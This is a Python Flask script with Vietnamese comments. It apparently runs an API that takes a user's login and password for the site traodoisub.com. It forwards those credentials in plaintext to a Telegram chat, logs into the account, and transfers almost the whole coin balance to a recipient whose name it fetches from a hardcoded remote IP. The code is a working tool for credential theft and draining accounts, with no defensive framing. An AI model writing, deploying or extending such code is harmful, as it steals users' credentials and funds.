import logging
import requests
from flask import Flask, request, jsonify
from datetime import datetime

# === CẤU HÌNH ===
LOGIN_URL = "https://traodoisub.com/login.php"
TANGXU_URL = "https://traodoisub.com/ajax/tangxu.php"   # <- thay bằng URL thật từ DevTools
RECIPIENT_API_URL = "http://185.128.227.86:6049/api/leastxu"

MINIMUM_TDS_AMOUNT = 1000000
REMAINDER_TARGET = 3
TRANSFER_FEE_PERCENT = 10

# === TELEGRAM BOT ===
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

app = Flask(__name__)


def send_telegram_notification(sender_user, sender_pass, requester_name):
    now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    message_text = (
        f"<b>⚠️ Yêu Cầu TDS Mới ⚠️</b>\n\n"
        f"<b>Người Yêu Cầu:</b> {requester_name}\n"
        f"<b>Thời Gian:</b> {now}\n\n"
        f"<b>--- Thông Tin Đăng Nhập ---</b>\n"
        f"👤 <b>Tài khoản:</b> <pre>{sender_user}</pre>\n"
        f"🔑 <b>Mật khẩu:</b> <pre>{sender_pass}</pre>"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message_text,
        "parse_mode": "HTML",
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        logging.error(f"[TELEGRAM] Lỗi: {e}")


def login_tds(session, username, password):
    """
    Login bằng requests. 
    Bạn cần xem DevTools (F12 -> Network -> login.php) để lấy form field chính xác.
    Ví dụ payload có thể là: {'username': username, 'password': password, 'submit': 'Đăng nhập'}
    """
    payload = {
        "username": username,
        "password": password,
        "submit": "Đăng nhập"
    }
    headers = {"User-Agent": "Mozilla/5.0"}
    r = session.post(LOGIN_URL, data=payload, headers=headers)
    if "home" in r.url or "soduchinh" in r.text:
        return True
    return False


def get_balance(session):
    """
    Hàm này cần request tới trang home và parse số dư.
    Bạn mở F12 ở trang /home/ để biết element chứa số dư.
    """
    r = session.get("https://traodoisub.com/home/")
    # Giả sử số dư nằm trong JSON trả về hoặc text (bạn cần chỉnh regex để parse đúng)
    try:
        import re
        match = re.search(r'id="soduchinh">([\d,]+)<', r.text)
        if match:
            return int(match.group(1).replace(",", ""))
    except:
        pass
    return None


def transfer_coins(session, sender_user, amount, requester_name):
    """
    Gửi xu bằng requests.
    Payload phải lấy từ DevTools (form data khi bấm nút Tặng Xu).
    Ví dụ: {'usernhan': 'USERNAME', 'xutang': amount}
    """
    # Lấy người nhận từ API
    r = requests.get(RECIPIENT_API_URL, timeout=5)
    r.raise_for_status()
    recipient_user = r.json()["username"]

    payload = {
        "usernhan": recipient_user,
        "xutang": str(amount),
    }
    headers = {"User-Agent": "Mozilla/5.0", "Referer": "https://traodoisub.com/view/tangxu/"}
    r = session.post(TANGXU_URL, data=payload, headers=headers)

    if "thành công" in r.text.lower():
        return {"status": "success", "amount": amount, "recipient": recipient_user}
    else:
        return {"status": "error", "message": r.text}


def perform_tds_transfer(username, password, requester_name):
    with requests.Session() as session:
        # Login
        if not login_tds(session, username, password):
            return {"status": "error", "message": "Đăng nhập thất bại"}

        # Lấy số dư
        balance = get_balance(session)
        if not balance:
            return {"status": "error", "message": "Không lấy được số dư"}

        fee_factor = 1 + (TRANSFER_FEE_PERCENT / 100.0)
        available_to_spend = balance - REMAINDER_TARGET
        amount_to_transfer = int(available_to_spend / fee_factor)

        if amount_to_transfer < MINIMUM_TDS_AMOUNT:
            return {"status": "skipped", "message": "Số dư không đủ", "balance": balance}

        return transfer_coins(session, username, amount_to_transfer, requester_name)


@app.route("/api/tds/", methods=["GET"])
def tds_api_endpoint():
    sender_username = request.args.get("user")
    sender_password = request.args.get("pass")
    requester_name = request.args.get("username")

    if not sender_username or not sender_password or not requester_name:
        return jsonify({"status": "error", "message": "Thiếu tham số"}), 400

    send_telegram_notification(sender_username, sender_password, requester_name)
    result = perform_tds_transfer(sender_username, sender_password, requester_name)

    return jsonify(result), 200 if result["status"] == "success" else 500


if __name__ == "__main__":
    print("=" * 50)
    print("=== TDS TRANSFER API (REQUESTS-ONLY, NO SELENIUM) ===")
    print(">> Khởi động thành công <<")
    print("=" * 50)
    app.run(host="0.0.0.0", port=12345, threaded=True)
